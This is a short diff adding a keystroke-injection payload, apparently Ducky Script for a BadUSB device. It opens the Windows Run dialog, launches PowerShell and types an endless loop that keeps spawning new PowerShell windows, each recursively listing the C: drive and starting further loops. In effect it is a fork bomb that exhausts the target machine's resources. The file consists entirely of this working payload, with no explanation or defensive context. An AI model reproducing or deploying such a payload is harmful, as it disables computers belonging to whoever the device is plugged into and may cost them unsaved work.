@@ -1,0 +1,8 @@
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING while ($true) { Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:"; Invoke-Expression -Command 'while ($true) { Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:" }' }
+DELAY 500
+ENTER
